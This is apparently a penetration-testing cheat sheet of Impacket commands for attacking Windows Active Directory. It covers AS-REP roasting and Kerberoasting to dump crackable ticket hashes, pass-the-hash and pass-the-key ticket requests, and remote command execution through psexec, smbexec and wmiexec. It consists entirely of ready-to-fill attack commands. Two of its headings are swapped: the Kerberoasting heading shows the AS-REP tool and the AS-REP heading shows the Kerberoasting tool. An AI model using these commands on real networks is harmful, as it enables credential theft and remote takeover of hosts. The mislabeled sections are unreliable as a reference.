## Check for Kerberoasting: 

- GetNPUsers.py DOMAIN-Target/ -usersfile user.txt -dc-ip <IP> -format hashcat/john

## GetUserSPNs

ASREPRoast:
- impacket-GetUserSPNs <domain_name>/<domain_user>:<domain_user_password> -request -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
- impacket-GetUserSPNs <domain_name>/ -usersfile <users_file> -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>

Kerberoasting: 
- impacket-GetUserSPNs <domain_name>/<domain_user>:<domain_user_password> -outputfile <output_TGSs_file> 

Overpass The Hash/Pass The Key (PTK):
- python3 getTGT.py <domain_name>/<user_name> -hashes [lm_hash]:<ntlm_hash>
- python3 getTGT.py <domain_name>/<user_name> -aesKey <aes_key>
- python3 getTGT.py <domain_name>/<user_name>:[password]

## Using TGT key to excute remote commands from the following impacket scripts:

- python3 psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
- python3 smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
- python3 wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass

